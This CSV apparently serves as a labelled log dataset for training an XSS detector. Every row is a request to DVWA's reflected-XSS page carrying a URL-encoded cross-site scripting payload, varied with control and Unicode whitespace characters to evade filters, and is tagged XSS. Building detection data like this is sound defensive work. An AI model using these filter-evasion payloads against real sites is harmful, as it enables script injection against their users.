ip,identity,user,timestamp,request,status,size,referer,user_agent,vulnerability,method,url,protocol,request_length,url_parts,user_agent_length,Predicted_Vulnerability
12.12.12.11,-,-,2024-07-01 15:59:07-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%5cx0Dtype%3d%22text%2fjavascript%22%3ejavascript%3aalert(1)%3b%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1724,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%5cx0Dtype%3d%22text%2fjavascript%22%3ejavascript%3aalert(1)%3b%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,178,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:59:12-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%5cx09type%3d%22text%2fjavascript%22%3ejavascript%3aalert(1)%3b%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1725,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%5cx09type%3d%22text%2fjavascript%22%3ejavascript%3aalert(1)%3b%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,178,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:59:17-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%5cx0Ctype%3d%22text%2fjavascript%22%3ejavascript%3aalert(1)%3b%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1723,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%5cx0Ctype%3d%22text%2fjavascript%22%3ejavascript%3aalert(1)%3b%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,178,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:59:22-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%5cx2Ftype%3d%22text%2fjavascript%22%3ejavascript%3aalert(1)%3b%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1724,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%5cx2Ftype%3d%22text%2fjavascript%22%3ejavascript%3aalert(1)%3b%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,178,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:59:27-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%5cx0Atype%3d%22text%2fjavascript%22%3ejavascript%3aalert(1)%3b%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1723,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%5cx0Atype%3d%22text%2fjavascript%22%3ejavascript%3aalert(1)%3b%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,178,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:59:33-04:00,GET /DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%5cx3Aexpression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1735,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%5cx3Aexpression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,162,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:59:38-04:00,GET /DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3aexpression%5cx5C(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1736,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3aexpression%5cx5C(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,165,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:59:43-04:00,GET /DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3aexpression%5cx00(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1736,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3aexpression%5cx00(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,165,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:59:48-04:00,GET /DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3aexp%5cx00ression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1736,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3aexp%5cx00ression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,165,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:59:53-04:00,GET /DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3aexp%5cx5Cression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1736,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3aexp%5cx5Cression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,165,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:59:58-04:00,GET /DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cx0Aexpression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1736,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cx0Aexpression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,165,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:00:03-04:00,GET /DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cx09expression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1737,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cx09expression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,165,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:00:09-04:00,GET /DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cxE3%5cx80%5cx80expression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1744,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cxE3%5cx80%5cx80expression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,177,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:00:14-04:00,GET /DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx84expression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1745,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx84expression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,177,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:00:19-04:00,GET /DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cxC2%5cxA0expression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1740,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cxC2%5cxA0expression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,171,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:00:24-04:00,GET /DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx80expression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1743,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx80expression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,177,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:00:30-04:00,GET /DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx8Aexpression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1743,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx8Aexpression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,177,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:00:35-04:00,GET /DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cx0Dexpression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1736,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cx0Dexpression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,165,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:00:40-04:00,GET /DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cx0Cexpression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1736,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cx0Cexpression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,165,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:00:45-04:00,GET /DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx87expression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1744,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx87expression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,177,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:00:51-04:00,GET /DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cxEF%5cxBB%5cxBFexpression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1742,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cxEF%5cxBB%5cxBFexpression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,177,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:00:56-04:00,GET /DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cx20expression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1736,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cx20expression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,165,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:01:01-04:00,GET /DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx88expression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1744,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx88expression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,177,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:01:07-04:00,GET /DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cx00expression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1736,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cx00expression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,165,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:01:12-04:00,GET /DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx8Bexpression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1743,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx8Bexpression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,177,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:01:18-04:00,GET /DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx86expression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1745,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx86expression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,177,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:01:23-04:00,GET /DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx85expression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1745,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx85expression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,177,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:01:29-04:00,GET /DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx82expression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1744,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx82expression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,177,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:01:34-04:00,GET /DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cx0Bexpression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1736,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cx0Bexpression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,165,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:01:39-04:00,GET /DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx81expression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1744,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx81expression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,177,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:01:45-04:00,GET /DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx83expression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1744,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx83expression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,177,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:01:50-04:00,GET /DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx89expression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1744,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx89expression(javascript%3aalert(1)%22%3eDEF&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,177,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:01:56-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3ca%20href%3d%22%5cx0Bjavascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1736,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3ca%20href%3d%22%5cx0Bjavascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,194,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:02:01-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3ca%20href%3d%22%5cx0Fjavascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1736,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3ca%20href%3d%22%5cx0Fjavascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,194,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:02:07-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3ca%20href%3d%22%5cxC2%5cxA0javascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1740,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3ca%20href%3d%22%5cxC2%5cxA0javascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,200,5,116,XSS
